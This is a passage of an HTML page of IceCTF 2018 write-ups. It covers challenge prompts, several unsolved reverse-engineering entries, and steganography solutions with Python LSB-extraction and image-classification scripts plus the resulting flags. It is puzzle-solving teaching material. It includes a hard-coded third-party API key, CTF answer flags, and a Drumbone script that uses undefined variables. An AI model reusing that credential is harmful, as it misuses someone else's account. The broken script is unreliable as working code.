</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="locked-out"> Locked out <a href="/CTF-writeups-public/writeups/IceCTF-2018/reverse-engineering-200-locked-out.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> This is a fancy looking lock, I wonder what would happen if you broke it open?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh -p 2222 ssh.icec.tf -l gg4ugw5xbsr2myw-lockedout
</pre></table></code></div></div><p>Note: the binary is <a href="writeupfiles/lock">here</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="passworded"> Passworded! <a href="/CTF-writeups-public/writeups/IceCTF-2018/reverse-engineering-400-passworded.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Alice loves to cause mayhem, and recently she sent this message to Bob! Bob is nothing but confused, leading to him asking for your help. Don’t let the world descend into chaos!</p><p>Note: The flag is of the format <code class="language-plaintext highlighter-rouge">IceCTF{&lt;text&gt;}</code> where <code class="language-plaintext highlighter-rouge">&lt;text&gt;</code> is the string the program accepts.</p><p><a href="writeupfiles/password.txt">password.txt</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>(((())|}|}|}|(][)||(}[}||(){[)|(&lt;}|||}|(){[)|(&lt;}(())))|}|{(((}[)||&lt;{(}[)|&lt;(}&lt;(}&gt;|&gt;|||||}||&lt;{(}[)|&lt;&gt;(}&gt;||||}|||}(())))|})|&lt;((}[)||&lt;{(}[)|&lt;(}[))))|&gt;|&gt;|||}||&lt;{(}[)|&lt;&gt;(}&gt;||||}||())|{(}[)|&lt;(}[((((())|}|}|}|}|}(((())|}|}|}|}))))||(}&lt;())[)||||{((}&gt;|[)|&lt;&lt;({&lt;(}[)|||&gt;(}|&gt;|}&gt;&lt;}||||||}((((((((((((((((((((())|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}((((((((((((((((((())|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}((((((((((((((((())|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}(((((((((((((((())|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}((((((((((((((())|}|}|}|}|}|}|}|}|}|}|}|}|}|}|}((((((((((((())|}|}|}|}|}|}|}|}|}|}|}|}|}((((((((((())|}|}|}|}|}|}|}|}|}|}|}(((((((((())|}|}|}|}|}|}|}|}|}|}((((((((())|}|}|}|}|}|}|}|}|}(((((((())|}|}|}|}|}|}|}|}((((((())|}|}|}|}|}|}|}|(}[}||(){[)|(&lt;}|||}|(){[)|(&lt;}(((((())|}|}|}|}|}[()))|}))||(}(&gt;||&gt;([)|)[)|{)&lt;&lt;((}||{(}[)||&gt;|}|||}&gt;&lt;}}||(){[)|(&lt;}((}|()||{(}[)|&lt;([}|)||||}(){[)|(&lt;}|||}|((}(}||[(}[}||||(((((())|}|}|}|}|}[(())|}|}))))||(}[}||(){[)|(&lt;}|||}|({&lt;}|}((&lt;)||||&lt;}}||(){[)|(&lt;}(()))|})|((}(}||[(}[}||||(}(&gt;||&gt;([)|{)&lt;((}||{(}[)||&gt;|}||}&gt;&lt;}}||(()))))|}|(}[}||(){[)|(&lt;}|||}|(){[)|(&lt;}(())|}|({)(}[)|||}))|({)(}[)|||}|(}[}||(){[)|(&lt;}|||}|(){[)|(&lt;}((((}||||(()))))|}|(()))))|}|(}&gt;|({&lt;(}[)|||&gt;(}|&gt;|}&gt;&lt;}||((}(}||[(}[}||||(}(&gt;||&gt;{((}||{(}[)||&gt;|}|}&gt;([})|}|([}|}|(()))))|}|(()))))|}|(}&gt;|({&lt;(}[)|||&gt;(}|&gt;|}&gt;&lt;}||((}(}||[(}[}||||(}(&gt;||&gt;([)|{)&lt;((}||{(}[)||&gt;|}||}&gt;&lt;}}||()|(}[}||(){[)|(&lt;}|||}|((}(}||[(}[}||||(()))))|}|((}(}||[(}[}||||(}(&gt;||&gt;{((}||{(}[)||&gt;|}|}&gt;([})|}|()|(}[}||(){[)|(&lt;}|||}|({&lt;}|}((&lt;)||||&lt;}}||((}||((}((}(}||[(}[}|||||[(}[}||||(}[}||(()))))|}|((}(}||[(}[}||||(}(&gt;||&gt;([)|{)&lt;((}||{(}[)||&gt;|}||}&gt;&lt;}}||(()))))|}|((}(}||[(}[}||||(}(&gt;||&gt;{((}||{(}[)||&gt;|}|}&gt;([})|}|({&lt;}|}((&lt;)||||&lt;}}||(){[)|(&lt;}())|())[)[))||[)||(}&gt;|({&lt;(}[)|||&gt;(}|&gt;|}&gt;&lt;}||(())|})|()))))|(}&gt;|({&lt;(}[)|||&gt;(}|&gt;|}&gt;&lt;}||(}&gt;|({&lt;(}[)|||&gt;(}|&gt;|}&gt;&lt;}||(}[}||(){[)|(&lt;}|||}|(){[)|(&lt;}((())|}|}|({(}|(}|(}[)|||}|(()))))|}|([}|}|(}[}||(){[)|(&lt;}|||}|(){[)|(&lt;}()&gt;|&gt;|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}|||}(&gt;{&lt;}|}((&lt;)||||&lt;}}|&gt;||||}|{}((&lt;(]|{(}[)|&lt;}|||}||||}
</pre></table></code></div></div><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flag
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="poke-a-mango"> Poke-A-Mango <a href="/CTF-writeups-public/writeups/IceCTF-2018/reverse-engineering-poke-a-mango.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I love these new AR games that have been coming out recently, so I decided that I would make my own with my favorite fruit! The Mango!</p><p>Can you poke 151 mangos?</p><p>NOTE Make sure that you allow the app access to your GPS location and camera otherwise the app will not work. You can do that in App Permissions in Settings.</p><p><a href="writeupfiles/pokemango.apk">apk</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>installing the app gives a map and a shop menu where it appears you need to find 151 mangoes to get the flag</p><p><img src="writeupfiles/pokemango.png" alt="" /></p><p>We decompile the app:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>apktool decode pokemango.apk
</pre></table></code></div></div><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="drumbone"> Drumbone <a href="/CTF-writeups-public/writeups/IceCTF-2018/steganography-150-drumbone.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I joined a couple of hacking channels on IRC and I started recieving these strange messages. Someone sent me this image. Can you figure out if there’s anything suspicous hidden in it?</p><p><img src="writeupfiles/drumbone.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Nothing in exif data, nothing with binwalk, nothing obvious, so we check the LSB of each challenge. The blue channel seems to consist of only odd number, this seems suspicious so we investigate furter. Mapping the LSB of each of the RGB channels to black or white gives the following result:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>

<span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">drumbone.png</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pixels</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>

<span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">)</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="n">size</span>
<span class="nf">print</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">)</span>

<span class="n">outimg_r</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">),</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>
<span class="n">outimg_g</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">),</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>
<span class="n">outimg_b</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">),</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>

<span class="n">pixels_r</span> <span class="o">=</span> <span class="n">outimg_r</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>
<span class="n">pixels_g</span> <span class="o">=</span> <span class="n">outimg_g</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>
<span class="n">pixels_b</span> <span class="o">=</span> <span class="n">outimg_b</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">w</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">h</span><span class="p">):</span>
    <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">pixels</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">pixels_r</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">g</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">pixels_g</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">b</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">pixels_b</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>

<span class="n">outimg_r</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="sh">"</span><span class="s">outimg_r.png</span><span class="sh">"</span><span class="p">)</span>
<span class="n">outimg_g</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="sh">"</span><span class="s">outimg_g.png</span><span class="sh">"</span><span class="p">)</span>
<span class="n">outimg_b</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="sh">"</span><span class="s">outimg_b.png</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>This gives us the following images:</p><p><img src="writeupfiles/drumbone_r.png" alt="" /> <img src="writeupfiles/drumbone_g.png" alt="" /> <img src="writeupfiles/drumbone_b.png" alt="" /></p><p>Bingpot! the blue channel seems to contain a QR code!</p><p>We clean up the image a bit to get our flag:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>

<span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">drumbone.png</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pixels</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>

<span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">)</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="n">size</span>
<span class="n">outimg_b</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">outw</span><span class="p">,</span><span class="n">outh</span><span class="p">),</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pixels_b</span> <span class="o">=</span> <span class="n">outimg_b</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>

<span class="n">wout</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
<span class="n">hout</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">w</span><span class="p">,</span><span class="mi">6</span><span class="p">):</span>
  <span class="n">wout</span> <span class="o">+=</span> <span class="mi">1</span>
  <span class="n">hout</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
  <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">h</span><span class="p">,</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">hout</span><span class="o">+=</span><span class="mi">1</span>
    <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">pixels</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">b</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">pixels_b</span><span class="p">[</span><span class="n">wout</span><span class="p">,</span><span class="n">hout</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>

<span class="n">outimg_b</span> <span class="o">=</span> <span class="n">outimg_b</span><span class="p">.</span><span class="nf">resize</span><span class="p">((</span><span class="mi">10</span><span class="o">*</span><span class="n">outw</span><span class="p">,</span><span class="mi">10</span><span class="o">*</span><span class="n">outh</span><span class="p">))</span>
<span class="n">outimg_b</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="sh">"</span><span class="s">outimg_b.png</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p><img src="writeupfiles/drumbone_qr.png" alt="" /></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{Elliot_has_been_mapping_bits_all_day}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{Elliot_has_been_mapping_bits_all_day} </code><hr><h1 id="hot-or-not"> Hot or Not <a href="/CTF-writeups-public/writeups/IceCTF-2018/steganography-300-hot-or-not.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>According to my friend Zuck, the first step on the path to great power is to rate the relative hotness of stuff… think Hot or Not.</p><p><img src="writeupfiles/hotornot.jpg" alt="" /> (this is a scaled-down image, original was &gt;70Mb)</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looking at the image more closely, we see it is made up of a series of subimages of either dogs or hotdogs.</p><p><img src="writeupfiles/hotornot_zoomed.png" alt="" /></p><p>Looks like we have to classify the subimages into hotdogs or regular dogs..</p><p>First we split the image up into all its subimages with imagemagick</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>convert <span class="nt">-crop</span> 224x224 +repage hotdogs/out%04d.jpg
</pre></table></code></div></div><p>Next, we can use <a href="https://clarifai.com">Clarifai</a> to do the image recognition to determine whether the subimages are dogs or hotdogs. Clarifai gives you 5000 free operations per month, but since we have a little over 7500 subimages, we needed two accounts to perform this analysis.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">from</span> <span class="n">clarifai.rest</span> <span class="kn">import</span> <span class="n">ClarifaiApp</span>
<span class="kn">from</span> <span class="n">clarifai.rest</span> <span class="kn">import</span> <span class="n">Image</span> <span class="k">as</span> <span class="n">ClImage</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">ClarifaiApp</span><span class="p">(</span><span class="n">api_key</span><span class="o">=</span><span class="sh">'</span><span class="s">f7f15032b1a04f1fafc2092c63e50e9f</span><span class="sh">'</span><span class="p">)</span>
<span class="n">model</span> <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">models</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">general-v1.3</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># detect image contents for all subimages
</span><span class="n">pixels</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">87</span><span class="o">*</span><span class="mi">87</span><span class="p">):</span>
    <span class="n">image</span> <span class="o">=</span> <span class="nc">ClImage</span><span class="p">(</span><span class="n">file_obj</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">hotdogs/out</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">.jpg</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">model</span><span class="p">.</span><span class="nf">predict</span><span class="p">([</span><span class="n">image</span><span class="p">])</span>

    <span class="n">hot</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">concepts</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="sh">'</span><span class="s">outputs</span><span class="sh">'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">'</span><span class="s">data</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">concepts</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">concept</span> <span class="ow">in</span> <span class="n">concepts</span><span class="p">:</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">food</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">concept</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]:</span>
            <span class="n">hot</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">pixels</span> <span class="o">+=</span> <span class="p">[</span><span class="mi">1</span> <span class="k">if</span> <span class="n">hot</span> <span class="o">==</span> <span class="bp">True</span> <span class="k">else</span> <span class="mi">0</span><span class="p">]</span>

<span class="c1"># make qr code image
</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="mi">87</span><span class="p">,</span><span class="mi">87</span><span class="p">)</span>

<span class="n">outimg</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> <span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">h</span><span class="p">),</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pixels_out</span> <span class="o">=</span> <span class="n">outimg</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">h</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">w</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">pixels</span><span class="p">[</span><span class="n">p</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">pixels</span><span class="p">[</span><span class="n">p</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">pixels_out</span><span class="p">[</span><span class="n">j</span><span class="p">,</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">pixels_out</span><span class="p">[</span><span class="n">j</span><span class="p">,</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">)</span>
        <span class="n">p</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">outimg</span> <span class="o">=</span> <span class="n">outimg</span><span class="p">.</span><span class="nf">resize</span><span class="p">((</span><span class="mi">5</span><span class="o">*</span><span class="n">w</span><span class="p">,</span><span class="mi">5</span><span class="o">*</span><span class="n">h</span><span class="p">))</span>
<span class="n">outimg</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="sh">"</span><span class="s">pixels_outimg2.png</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">png</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>This outputs the following image:</p><p><img src="writeupfiles/hotornot_rawoutput.png" alt="" /></p><p>This is clearly a QR code, it is just missing the corner anchors. We add these and clean the image up slightly:</p><p><img src="writeupfiles/hotornot_qr.png" alt="" /></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{h0td1gg1tyd0g}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{h0td1gg1tyd0g} </code><hr><h1 id="rabbit-hole"> Rabbit Hole <a href="/CTF-writeups-public/writeups/IceCTF-2018/steganography-400-rabbit-hole.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Here’s a picture of my favorite vegetable. I hope it doesn’t make you cry.</p><p><img src="writeupfiles/rabbithole.jpg" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After a lot of experimenting, we find out we can uncover a hidden message from the image using steghide:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>steghide extract <span class="nt">-sf</span> rabbithole.jpg
Enter passphrase: &lt;onion&gt;
wrote extracted data to <span class="s2">"address.txt"</span><span class="nb">.</span>
</pre></table></code></div></div><p>whoo! contents of the file <code class="language-plaintext highlighter-rouge">address.txt</code> is:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wsqxiyhn23zdi6ia
